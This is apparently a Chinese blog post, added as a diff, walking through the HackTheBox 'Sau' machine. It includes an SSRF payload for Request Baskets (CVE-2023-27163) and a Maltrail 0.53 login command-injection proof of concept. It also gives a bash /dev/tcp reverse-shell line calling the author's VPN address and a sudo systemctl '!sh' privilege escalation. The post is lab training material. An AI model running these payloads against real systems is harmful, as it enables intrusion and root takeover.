@@ -1,0 +1,468 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>HTB Sau | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Requests-Baskets-CVE-2023-27163"><span class="toc-number">3.</span> <span class="toc-text">Requests Baskets CVE-2023-27163</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Maltrail"><span class="toc-number">4.</span> <span class="toc-text">Maltrail</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.1.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#systemctl%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">systemctl提权</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>HTB Sau</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/11/26
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/%E6%B8%97%E9%80%8F/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/HackTheBox/" style="color: #ff7d73">HackTheBox</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">868字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">3分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>正式开始htb打靶的旅程，频率大概会保持一周一个靶机</p>
+<p>就从Sau开始</p>
+<span id="more"></span>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>拿到ip之后第一件事情就是开扫</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126115935292.png" alt="image-20231126115935292"></p>
+<p>开了个80，55555端口，访问一手</p>
+<p>80端口进不去，可以访问55555端口</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126120109628.png" alt="image-20231126120109628"></p>
+<p>看起来是个Requests Baskets的框架，版本是1.2.1</p>
+<blockquote>
+<p>Request Baskets是rbaskets开源的一个Web服务，用于收集任意 HTTP 请求并通过 RESTful API 或简单的 Web UI 检查它们</p>
+</blockquote>
+<p>收集http请求，emmm猜测有ssrf，先搜看看有没有什么相关的框架漏洞</p>
+<p>搜一下发现存在CVE-2023-27163：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2023-27163">https://avd.aliyun.com/detail?id=AVD-2023-27163</a></p>
+<hr>
+<h1 id="Requests-Baskets-CVE-2023-27163"><a href="#Requests-Baskets-CVE-2023-27163" class="headerlink" title="Requests Baskets CVE-2023-27163"></a>Requests Baskets CVE-2023-27163</h1><p>漏洞细节：<a target="_blank" rel="noopener" href="https://notes.sjtu.edu.cn/s/MUUhEymt7#">https://notes.sjtu.edu.cn/s/MUUhEymt7#</a></p>
+<p>request baskets服务存在api接口<code>/api/baskets/&#123;name&#125;</code>，<code>/baskets/&#123;name&#125;</code>，这里的name可以任意，这些接口会接收一个forward_url参数，而这个参数存在SSRF漏洞</p>
+<p>点击create按钮，抓包api，根据文章中的payload传入请求体</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"forward_url"</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1:80/test"</span><span class="token punctuation">,</span>
+  <span class="token property">"proxy_response"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token property">"insecure_tls"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token property">"expand_path"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+  <span class="token property">"capacity"</span><span class="token operator">:</span> <span class="token number">250</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126122540213.png" alt="image-20231126122540213"></p>
+<p>这样子就设置了url，发包过去之后需要访问网址10.10.11.224:55555&#x2F;test触发SSRF漏洞</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126122817981.png" alt="image-20231126122817981"></p>
+<p>返回200，说明漏洞确实存在，但是没有任何回显</p>
+<p>我们看一下这个漏洞的影响：<strong>对内部网络 HTTP 服务器的未经身份验证的访问</strong></p>
+<p>那么应该是因为我们的<code>proxy_response</code>没有设置为true，这里应该是控制是否将请求的url内容转发过来，那么我们再传一次</p>
+<p>注意这里forward_url的路径要改为<code>/</code>，因为我们不知道127.0.0.1:80具体有什么内容</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"forward_url"</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1:80/"</span><span class="token punctuation">,</span>
+  <span class="token property">"proxy_response"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+  <span class="token property">"insecure_tls"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token property">"expand_path"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+  <span class="token property">"capacity"</span><span class="token operator">:</span> <span class="token number">250</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126123657143.png" alt="image-20231126123657143"></p>
+<p>访问&#x2F;test3</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126123726561.png" alt="image-20231126123726561"></p>
+<p>成功显示了靶机80端口的网页</p>
+<p>发现是Maltrail框架，版本0.53</p>
+<hr>
+<h1 id="Maltrail"><a href="#Maltrail" class="headerlink" title="Maltrail"></a>Maltrail</h1><blockquote>
+<p>maltrail是开源的恶意流量检测系统</p>
+</blockquote>
+<p>搜一下Maltrail 0.53相关的漏洞，这里建议用英文maltrail vulnerability搜</p>
+<p>漏洞细节：<a target="_blank" rel="noopener" href="https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></p>
+<blockquote>
+<p>Maltrail &lt;&#x3D; v0.54 在登录过程中容易受到未经身份验证的操作系统命令注入的影响。</p>
+</blockquote>
+<p>poc：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">'http://hostname:8338/login'</span> <span class="token punctuation">\</span> <span class="token parameter variable">--data</span> <span class="token string">'username=;`id > /tmp/bbq`'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在登入页面，请求体发送相应内容，可以执行系统命令，图片上执行id命令并将内容输出到&#x2F;tmp&#x2F;bbq。</p>
+<p>利用此任意命令执行漏洞可以尝试反弹shell</p>
+<p>因为这个漏洞需要login页面，所以再次用request baskets进行ssrf</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"forward_url"</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1:80/login"</span><span class="token punctuation">,</span>
+    <span class="token property">"proxy_response"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+    <span class="token property">"insecure_tls"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+    <span class="token property">"expand_path"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+    <span class="token property">"capacity"</span><span class="token operator">:</span> <span class="token number">250</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126124605826.png" alt="image-20231126124605826"></p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126124641129.png" alt="image-20231126124641129"></p>
+<p>返回了login failed，说明成功访问login页面了</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>nc监听12345端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>bp抓包&#x2F;test4，修改请求体，弹的ip直接弹到我们的ovpn代理的ip上即可</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token punctuation">;</span><span class="token variable"><span class="token variable">`</span><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"bash -i >&amp; /dev/tcp/10.10.14.11/12345 0>&amp;1"</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126130023145.png" alt="image-20231126130023145"></p>
+<p>但是这里不知道为什么没弹成。。。</p>
+<p>这里有个GitHub上的项目可以利用：<a target="_blank" rel="noopener" href="https://github.com/spookier/Maltrail-v0.53-Exploit">https://github.com/spookier/Maltrail-v0.53-Exploit</a></p>
+<p>这里需要修改一下它的exp内容，把第三个参数后面加上的&#x2F;login删掉</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 Maltrail-v0.53-exploit.py <span class="token number">10.10</span>.14.11 <span class="token number">12345</span> http://10.10.11.224:55555/test4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126130915026.png" alt="image-20231126130915026"></p>
+<p>成功弹shell</p>
+<p><code>user flag</code>在&#x2F;home&#x2F;puma&#x2F;user.txt</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126131209803.png" alt="image-20231126131209803"></p>
+<h1 id="systemctl提权"><a href="#systemctl提权" class="headerlink" title="systemctl提权"></a>systemctl提权</h1><p>用<code>sudo -l</code>查看授权的命令列表</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126131430327.png" alt="image-20231126131430327"></p>
+<p>有<code>/usr/bin/systemctl status trail.service</code>，在GTFOBins上搜一下，找到systemctl提权</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126132415941.png" alt="image-20231126132415941"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl status trail.service
+<span class="token operator">!</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126132350734.png" alt="image-20231126132350734"></p>
+<p>提权成功</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126132554066.png" alt="image-20231126132554066"></p>
+<p><code>root flag</code>在&#x2F;root&#x2F;root.txt</p>
+<p>收工！</p>
+<p><img src="/blog/2023/11/26/HTB-Sau/image-20231126132714049.png" alt="image-20231126132714049"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
